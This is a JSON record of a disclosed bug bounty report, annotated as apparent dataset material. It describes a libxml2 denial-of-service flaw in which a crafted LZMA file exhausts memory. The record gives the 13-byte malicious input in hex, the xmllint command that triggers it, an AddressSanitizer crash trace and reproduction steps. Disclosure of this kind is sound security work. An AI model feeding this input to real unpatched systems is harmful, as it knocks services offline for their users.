{
  "reported_to": "Internet Bug Bounty",
  "reported_by": "geeknik ",
  "title": "Denial of service in libxml2, using malicious lzma file to consume available system memory",
  "content": "\nReported to the libxml2 devs on 23 August 2017\nPatched on 7 September 2017\nIt was discovered through fuzzing that malicious LZMA compressed files could consume large amounts of memory when decompressed thus posing a DoS risk. I am unsure if a CVE will be assigned in this case.\nCode 72 Bytes\n1od -tx1 ./test000\n20000000 30 ff ff ff ff ff ff ff ff ff ff ff ff\n30000015\nCode 2.68 KiB\n1./xmllint --valid test000\n2==31393==ERROR: AddressSanitizer failed to allocate 0x100002000 (4294975488) bytes of LargeMmapAllocator (error code: 12)\n3==31393==Process memory map follows:\n4        0x000000400000-0x000000fea000   /root/libxml2/xmllint\n5        0x0000011ea000-0x0000011eb000   /root/libxml2/xmllint\n6        0x0000011eb000-0x00000161e000   /root/libxml2/xmllint\n7        **SNIP**\n8        0x7f811e9e3000-0x7f811e9e4000\n9        0x7ffe02632000-0x7ffe02753000   [stack]\n10        0x7ffe027a9000-0x7ffe027ab000   [vvar]\n11        0x7ffe027ab000-0x7ffe027ad000   [vdso]\n12        0xffffffffff600000-0xffffffffff601000   [vsyscall]\n13==31393==End of process memory map.\n14==31393==AddressSanitizer CHECK failed: /build/llvm-toolchain-4.0-Ha24C1/llvm-toolchain-4.0-4.0/projects/compiler-rt/lib/sanitizer_common/sanitizer_common.cc:120 \"((0 && \"unable to mmap\")) != (0)\" (0x0, 0x0)\n15    #0 0x4da55f in __asan::AsanCheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4da55f)\n16    #1 0x4f52d5 in __sanitizer::CheckFailed(char const*, int, char const*, unsigned long long, unsigned long long) (/root/libxml2/xmllint+0x4f52d5)\n17    #2 0x4e4902 in __sanitizer::ReportMmapFailureAndDie(unsigned long, char const*, char const*, int, bool) (/root/libxml2/xmllint+0x4e4902)\n18    #3 0x4ee205 in __sanitizer::MmapOrDie(unsigned long, char const*, bool) (/root/libxml2/xmllint+0x4ee205)\n19    #4 0x4218e2 in __asan::asan_malloc(unsigned long, __sanitizer::BufferedStackTrace*) (/root/libxml2/xmllint+0x4218e2)\n20    #5 0x4d0544 in malloc (/root/libxml2/xmllint+0x4d0544)\n21    #6 0x7f811e38926e  (/lib/x86_64-linux-gnu/liblzma.so.5+0xf26e)\n22    #7 0x7f811e382fe0  (/lib/x86_64-linux-gnu/liblzma.so.5+0x8fe0)\n23    #8 0x7f811e383472  (/lib/x86_64-linux-gnu/liblzma.so.5+0x9472)\n24    #9 0x7f811e37ceb0 in lzma_code (/lib/x86_64-linux-gnu/liblzma.so.5+0x2eb0)\n25    #10 0xee7fb6 in xz_decomp /root/libxml2/xzlib.c:577:19\n26    #11 0xee6bd9 in xz_make /root/libxml2/xzlib.c:652:13\n27    #12 0xee4fbf in __libxml2_xzread /root/libxml2/xzlib.c:743:17\n28    #13 0x78121a in xmlXzfileRead /root/libxml2/xmlIO.c:1435:11\n29    #14 0x78b8bb in xmlParserInputBufferGrow /root/libxml2/xmlIO.c:3337:8\n30    #15 0x5571e7 in xmlParserInputGrow /root/libxml2/parserInternals.c:324:8\n31    #16 0x58669d in xmlGROW /root/libxml2/parser.c:2090:5\n32    #17 0x67d68d in xmlParseDocument /root/libxml2/parser.c:10590:5\n33    #18 0x6d4114 in xmlDoRead /root/libxml2/parser.c:15183:5\n34    #19 0x51b413 in parseAndPrintFile /root/libxml2/xmllint.c:2391:9\n35    #20 0x5125dc in main /root/libxml2/xmllint.c:3767:7\n36    #21 0x7f811d4893f0 in __libc_start_main /build/glibc-mXZSwJ/glibc-2.24/csu/../csu/libc-start.c:291\n37    #22 0x41abb9 in _start (/root/libxml2/xmllint+0x41abb9)\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": null,
  "weaknesses": [
    "Uncontrolled Resource Consumption"
  ],
  "screenshots": {},
  "disclosed_date": 1570225200,
  "report_url": "https://hackerone.com/reports/270059",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Create a malicious LZMA compressed file with the following content: '30 ff ff ff ff ff ff ff ff ff ff ff ff'"
    ],
    [
      2,
      "Run the command './xmllint --valid test000' where test000 is the malicious file"
    ]
  ],
  "vuln_description": "A denial of service vulnerability in libxml2 where a malicious LZMA compressed file can cause excessive memory consumption when decompressed, leading to a system crash or unavailability.",
  "reason": "The vulnerability was discovered through fuzzing, which is a common technique for finding such issues. The attack involves a single component (the malicious file) and does not require complex interactions or state manipulation.",
  "new_complexity": "LOW",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}